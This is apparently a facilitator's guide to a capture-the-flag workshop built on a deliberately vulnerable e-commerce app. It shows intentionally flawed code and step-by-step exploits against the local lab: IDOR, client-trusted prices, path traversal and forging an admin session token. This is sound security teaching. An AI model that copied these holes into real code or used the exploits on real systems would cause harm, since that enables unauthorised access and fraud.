01. How to run the session

The premise: a startup called NeonCart shipped an e-commerce platform that was written entirely by AI agents — fast, confident and barely reviewed. The code is released to the room one stage at a time. Players read it, run it, break it and capture the flag the app produces. Some flags are reached through bugs in the code.

Before the doors open

  1. Provision Appwrite 
    cd appwrite
npm install
cp env.sample .env          # add your Appwrite API key
npm run setup
npm run deploy
npm run check
  2. Start the local admin panel 
    cd admin
npm install
cp env.sample .env          # add the same Appwrite API key
npm run dev
  3. Start the portal 
    cd portal
npm install
npm run dev

Tell the room this, in one sentence

"Sign into the portal with the account we gave you. When a module opens, download its zip, run the complete app with the seed shown in the portal, investigate it, and submit your flag there. The six modules are worth 50, 100, 200, 350, 500, and 700 points."

02. Mechanics players will meet

What the player seesWhat it means
Locked The facilitator has not released this module yet.
flag · 50–700 pts Each module has one flag. Point values are 50, 100, 200, 350, 500, and 700 for modules 00–05.
Badge: LOCKED Not released yet. Wait for the admin.
Badge: OPEN The facilitator released it. Its stage zip is downloadable by every player.
Badge: UNLOCKED + Submit You have the code. Find the bug, capture the flag, submit it.
Button: Refresh status Check whether the facilitator has released this module since the portal was opened.
SOLVED Flag accepted and the module's listed points are added to your score. There are no speed or early-unlock bonuses.

Flags are unique per player

Stage zips are shared. Your seed is shown in your signed-in portal account; pass it to the app with PLAYER_SEED or put it in config/player-license.json. Flags are derived from that seed, so different players receive different flags.

03. Module 00 — Project Scaffold the opener

Teaches: the loop the whole session is built on — download the snapshot, run it, read the flag the app prints, submit it in the portal. There is no technique here and there does not need to be one. The deployment stamped a build key into the storefront, and the storefront is the first thing a player sees.

The code the player is reading

// src/routes/00-storefront.js
function buildKey() {
  if (!SALT) return null
  try {
    return deriveFlag(readLicense().seed, SALT)   // ← the seed is yours alone
  } catch {
    // seed comes from the portal or config/player-license.json
    return null
  }
}

Solution — in the browser

  1. Run the app — node server.js, then open http://localhost:3307. You land on the NeonCart storefront: three products, shipping badges, the usual noise.
  2. Scroll to the bottom — the last panel is Build information: a build number and a Build key.
  3. Read the build key — it is FLAG{…}, in the same green as every flag in this session.
  4. Submit it in the portal's module 00 box → 50 points.

Solution — with curl

curl -s http://localhost:3307/ | grep -o 'FLAG{[0-9a-f]*}'
# FLAG{489fe6a210}

What the log shows

Nothing special — this module has no exploit, only a page. Say that out loud: the app is not where the flag lives, the response is.

Where players get stuck

  • They look for a challenge and find nothing to break. Reassure them: module 00 is a guided warm-up, and the flag is printed — their first win is learning where a flag comes from.
  • They try to grep the source for FLAG{ and find nothing. That is the point of the whole platform: no flag text ever exists in the code, only in a response.
  • They have not supplied their seed. Use the PLAYER_SEED command shown in the portal, or paste their seed into config/player-license.json.

Hints, in order

1. Run the app and open the home page. Read the page top to bottom.
2. The deployment prints a build key on the storefront. Where would a build stamp live?
3. Scroll to the bottom of http://localhost:3307 — the Build information panel.

04. Module 01 — Diagnostics very easy

Teaches: an endpoint that should not be public. No technique needed — just look at what the app exposes. This is the opener: it proves to the room that the exploit is a real, findable thing and not a trick.

The code the player is reading

// src/routes/01-diagnostics.js
function diagnostics(req, res) {
  log.info('diagnostics', 'diagnostics report requested')
  json(res, 200, {
    service: 'neoncart',
    build: '0.4.2-ai-preview',
    node: process.version,
    features: ['catalog', 'checkout', 'uploads', 'tickets', 'sessions'],
    internal_build_key: deriveFlag(readLicense().seed, SALT),   // ← no auth check anywhere
  })
}

Solution — in the browser

  1. Open the app — http://localhost:3307. You land on the storefront. The nav bar is the shop's own menu: Storefront, System status, Support, Checkout, Profile, Account.
  2. Click “System status” in the nav bar. Every service shows as operational — and there is a “Full report” section with a Refresh report button.
  3. Click “Refresh report”. The raw service report is printed in the box.
  4. Read internal_build_key in the report — that value is FLAG{…}.
  5. Submit it in the portal's module 01 box → 100 points.

Solution — with curl

curl -s http://localhost:3307/api/debug/diagnostics
# {"service":"neoncart",…,"internal_build_key":"FLAG{eda4a95875}"}

What the log shows

info [diagnostics] diagnostics report requested — the app tells you it served the report. Nothing else is needed.

Where players get stuck

  • They scroll past the nav bar and try to read every file. Point them at the nav: the pages are the app's own menu.
  • They look for the flag in the source code. Explain that flags are never in the code — only the response carries one.
  • They never press “Refresh report” because the status page already says everything is fine. The interesting part is the report, not the badges.

Hints, in order

1. The app lists everything it can do. Start from the nav bar.
2. The status page offers a “full report”. What would a report that nobody reads carefully contain?
3. Try GET /api/debug/diagnostics and read the whole response.

05. Module 02 — Support Tickets easy

Teaches: an object that belongs to somebody else. The list endpoint filters by owner; the detail endpoint was written earlier and never got the same treatment. The flag is inside a staff-only ticket.

The code the player is reading

// src/routes/02-tickets.js
function listTickets(req, res) {
  const mine = TICKETS.filter((t) => t.owner === DEMO_USER)   // ← list DOES check the owner
  json(res, 200, { tickets: mine })
}

function getTicket(req, res, body, url) {
  const id = Number(url.searchParams.get('id'))
  const ticket = TICKETS.find((t) => t.id === id)             // ← detail does NOT check the owner
  if (!ticket) return json(res, 404, { error: 'ticket not found' })
  json(res, 200, { ticket })
}

Solution — in the browser

  1. Click “Support” in the nav bar. Under “Your requests” you see two rows — #2 and #3.
  2. Click one of them. The URL becomes /ui/tickets?id=2. That is how the app addresses a ticket.
  3. Change the id in the URL to 1 and press enter.
  4. Read the ticket — “Incident report 4711”, owner staff, ending with the handover code, which is FLAG{…}.
  5. Submit it in the portal.

Solution — with curl

curl -s "http://localhost:3307/api/tickets/detail?id=1"
# {"ticket":{"id":1,"owner":"staff","subject":"Incident report 4711",…}}

What the log shows

info [tickets] opened ticket 1 (owner: staff) — the server prints the owner it served. That line is the hint that the check is missing.

Where players get stuck

  • They only try ids 2 and 3 because those are the ones listed. The whole point is that the list does not show everything.
  • They try /api/tickets/1 (path style) instead of /api/tickets/detail?id=1 — the app uses a query parameter. The route list at GET / shows the exact shape.
  • They never notice that the URL carries the ticket id. Click a ticket and look at the address bar — that is the whole trick.

Hints, in order

1. You can only see your own tickets. But the server can serve any ticket by id.
2. What id is missing from your list?
3. Open a ticket and look at the URL, then change the number in it.

06. Module 03 — Billing & Checkout easy–medium

Teaches: never trust a price that came from the client. The checkout takes the amount to charge straight from the request, and orders below list price go through an internal re-pricing path that prints the internal coupon code.

The code the player is reading

// src/routes/03-billing.js
const expected = item.price * qty

// The agents let the client send the amount it wants to pay, because the
// mobile app "already calculated it".
const total = amount === undefined ? expected : Number(amount)

if (total < expected) {
  // Support fix path: orders below list price are re-priced by the internal
  // coupon engine and logged with the internal promo code.
  return json(res, 200, {
    order_id: order.id,
    charged: total,
    discount_applied: true,
    internal_coupon: deriveFlag(readLicense().seed, SALT),
  })
}

Solution — in the browser

  1. Click “Checkout” in the nav bar. Add the drone to the cart — the total shows $199.00, exactly like a real shop.
  2. Open the browser's devtools → Network → Fetch/XHR and press Place order. The request body shows what the browser sent: item_id, quantity and amount.
  3. Edit the request so amount is 1 (Chrome: right-click the request → Edit and Resend), or call the endpoint yourself with that body.
  4. Read internal_coupon from the response — that is FLAG{…}.
  5. Submit it in the portal.

The same fact is visible without devtools: the page's own script is part of the module source you downloaded — src/routes/03-billing.js contains the pay() function, and it sends amount: cartTotal(). The server never recomputes the price.

Solution — with curl

curl -s -X POST http://localhost:3307/api/checkout \
  -H 'content-type: application/json' \
  -d '{"item_id":"neon-drone","quantity":1,"amount":1}'
# {"order_id":1,"charged":1,"discount_applied":true,"internal_coupon":"FLAG{…}"}

What the log shows

warn [billing] order 1 paid 1 instead of 199 - re-priced by the internal coupon engine

Where players get stuck

  • They assume the form is authoritative and pay the list price. The point is that the client decides the amount.
  • They look for a discount code to enter. There is none: you change the amount in the request.
  • They never open devtools. Tell them where the number comes from: the page's own JavaScript, which is in the file they downloaded.

Hints, in order

1. Who decides how much you pay — the server, or the browser?
2. Open devtools → Network, place an order, and look at what was sent.
3. {"item_id":"neon-drone","quantity":1,"amount":1}

07. Module 04 — Profile & File Uploads medium

Teaches: where the server joins your input. The file name is "sanitised" by stripping leading slashes only, then joined onto the upload directory — so ../ still walks out of it, into the private vault that holds the storage key.

The code the player is reading

// src/routes/04-uploads.js
// The agents sanitised the file name by stripping leading slashes and calling
// it a day. The name is still joined onto the upload directory as-is.
function safeName(name) {
  return String(name || '').replace(/^\/+/, '')
}

function download(req, res, body, url) {
  const name = url.searchParams.get('name') || 'avatar.png'
  const target = path.join(UPLOAD_DIR, safeName(name))   // ← no "is it still inside?" check
  if (!fs.existsSync(target)) return json(res, 404, { error: 'file not found' })
  res.writeHead(200, { 'content-type': 'text/plain' })
  res.end(fs.readFileSync(target, 'utf8'))
}

The flag is not a file in the source tree — the app writes it at startup into storage/private/vault.txt, outside the upload directory: 

function init() {
  fs.mkdirSync(UPLOAD_DIR, { recursive: true })
  fs.mkdirSync(PRIVATE_DIR, { recursive: true })
  // The deployment writes the signed storage key here …
  const vault = path.join(PRIVATE_DIR, 'vault.txt')
  fs.writeFileSync(vault, deriveFlag(readLicense().seed, SALT))
}

Solution — in the browser

  1. Click “Profile” in the nav bar. Under “Your files” is a gallery of the files you uploaded.
  2. Look at a download link — it points at /api/files/download?name=avatar.png. The name is a parameter.
  3. Change the name in the link to ../private/vault.txt and open it.
  4. Read the response — the vault contents, which is FLAG{…}.
  5. Submit it in the portal.

Solution — with curl

curl -s "http://localhost:3307/api/files/download?name=../private/vault.txt"
# FLAG{eda4a95875}

What the log shows

debug [storage] serving file "../private/vault.txt" from private/vault.txt — the server prints the path it resolved. That single line gives the whole exploit away.

Where players get stuck

  • They try /etc/passwd — outside the app folder, so it does not exist in the snapshot. The target is inside the app, one directory up.
  • They need to find the private folder. ls storage/private in the app folder, or the log line after the first attempt, shows the name.
  • They forget that the name is a query parameter: ?name=…, and the dots must survive URL encoding.
  • They never look at the gallery links. The link already contains the parameter they need to change.

Hints, in order

1. The sanitiser only strips leading slashes. What does it not strip?
2. The flag is in a file, one directory above the upload folder. What is that folder called?
3. Right-click a file in “Your files”, copy the link, and edit the name in it.

08. Module 05 — Sessions & Tokens medium · finale

Teaches: what the server trusted without checking. A session token looks like base64url(payload).signature. The payload is readable, and the verification helper only checks the shape of the token — the signature is never compared with the value the server computes.

The code the player is reading

// src/routes/05-sessions.js
// The agents wrote a "verify" helper that only looked at the shape of the
// token. The signature was never compared with anything.
function verify(token) {
  if (!token || typeof token !== 'string') return null
  const parts = token.split('.')
  if (parts.length !== 2) return null
  if (!parts[0] || !parts[1]) return null     // ← shape only
  return JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'))  // ← payload trusted as-is
}

function adminPanel(req, res) {
  const payload = verify(bearer(req))
  if (!payload) return json(res, 401, { error: 'invalid session' })
  if (payload.role !== 'admin') return json(res, 403, { error: 'staff role required for the internal panel' })
  json(res, 200, { panel: 'neoncart internal', staff_code: deriveFlag(readLicense().seed, SALT) })
}

Solution — by hand (no tooling)

  1. Click “Account” in the nav bar. Under “Active session” the token this browser is signed in with is already in the box.
  2. Split it on the dot. The part before the dot is the payload, base64url encoded.
  3. Decode it: in a terminal echo eyJ1c2VyX2lkIjo0Miwi… | base64 -d → you see {"user_id":42,"role":"user","issued_at":…}.
  4. Change "role":"user" to "role":"admin" and re-encode: echo -n '{"user_id":42,"role":"admin","issued_at":1}' | base64 -w0 | tr '+/' '-_' | tr -d '='
  5. Keep the original signature (everything after the dot) — the server never checks it.
  6. Paste the new token into the token box, press Open staff panel → staff_code is FLAG{…}.

Solution — one line of node

node -e "
const t='<token from Issue session>';
const [p,s]=t.split('.');
const pl=JSON.parse(Buffer.from(p,'base64url').toString('utf8'));
pl.role='admin';
console.log(Buffer.from(JSON.stringify(pl)).toString('base64url')+'.'+s);
"

Solution — with curl

# 1. get a token
curl -s -X POST http://localhost:3307/api/session/issue \
  -H 'content-type: application/json' -d '{"user_id":42}'

# 2. flip the role in the payload, keep the signature
#    (see the node one-liner above)

# 3. open the panel with the forged token
curl -s http://localhost:3307/api/admin/panel -H 'authorization: Bearer <forged>'
# {"panel":"neoncart internal","staff_code":"FLAG{…}"}

What the log shows

warn [session] internal panel refused: token role is "user", panel needs "admin"
info [session] internal panel opened with a staff token

Where players get stuck

  • They assume the signature protects the payload and try to crack it. It does not — the server never recomputes it.
  • They never find the token. It is on the Account page, in the “Active session” box.
  • They edit the payload but forget to re-encode base64url, or they re-encode with standard base64 (+ and / instead of - and _).
  • They re-encode and lose the trailing = padding — that is fine, it is optional.
  • They try to change the signature instead. Read the verify() function again: it checks the shape, never the value.

Hints, in order

1. What exactly does verify() compare? Nothing — it only checks the token has two non-empty parts.
2. The payload is base64url. Decode it, look at the fields, and ask which one the panel checks.
3. The Account page shows your session token. Decode it, set role:"admin", re-encode, keep the signature.

09. Suggested run of show

This is one possible 90-minute schedule. Releases happen immediately when the facilitator presses Release in the local admin panel; adapt the timing to the room. There are no countdowns or automatic releases.

ClockAdmin doesPlayers experience
00:00 Welcome the room, explain the rules, and distribute the portal link and individual accounts. Sign in and confirm that the portal opens.
00:10 Release module 00. Download, extract, run it with the seed shown in the portal. The storefront prints the build key — the first flag and a walkthrough of the submission loop.
00:20 Release module 01. Introduce the first bug-finding challenge.
00:30 Release module 02 as soon as the room is moving. IDOR; give players time to compare the list and detail behavior.
00:45 Give a verbal hint if needed. Release module 03. Client price. The first "money" module gets attention.
01:00 Release module 04. Announce: "one module left". Path traversal. Expect the first real searching.
01:15 Release module 05 (finale). Token forgery — the biggest idea of the session.
01:30 Stop submissions and show the admin-only leaderboard. Debrief: name each bug class and discuss how to fix it.

Do not let module 00 turn into a code-reading lecture

Module 00 carries a flag, but it is printed, not broken. Give it ten minutes: the point is that the room learns the loop — download, run, read the response, submit — before any bug is on the table. Then release module 01 and let the first real capture turn "I am reading code" into "I am breaking code".

10. Troubleshooting

SymptomCauseFix
Player says "the flag is wrong" The app may be running without that player's seed, or the player may have copied someone else's flag. Check the PLAYER_SEED command from their portal account, or inspect their local config/player-license.json. Each player's flag is different.
The first flag does not appear The player may have skipped the seed or not extracted the archive. Run the command shown in the portal, or replace the placeholder in config/player-license.json with their portal seed. Make sure they extracted the zip before running it.
"administrator mode not enabled" / 403s everywhere The flag path is guarded, but the exploit did not land. Check the log page. It prints exactly what the server did with the request.
Two players claim the same flag They may have used the same submitted text, or one may have run the app with the wrong seed. Check each player's portal seed and the command they used to start the app. Flags are derived per player.
Port 3307 already in use A previous copy of the app is still running. PORT=3308 node server.js — the port is only a convention.
A released module still shows as locked The portal does not continuously refresh module release status. Use that module's Refresh status button or reload the portal.
Player sign-in succeeds but the portal says the account has no access The account is missing the player label or its player row. Create the account from the local admin panel and check that player creation completed. Do not add the label from the player-facing portal.

11. Glossary for players

TermIn one sentence
IDORInsecure Direct Object Reference — asking for a record by id and the server hands it over without checking it is yours.
Path traversalUser input that is joined onto a file path and then walks out of the intended folder with ../.
Client-side trustBelieving a number the browser sent. The browser is on the player's side, so nothing it sends is authoritative.
SignatureThe part of a token that proves it was issued by the server — but only if the server actually checks it.
base64urlAn encoding, not encryption. Anyone can decode a base64url string, so never put a secret in a payload.
ExploitInput that makes the server do something it should not.
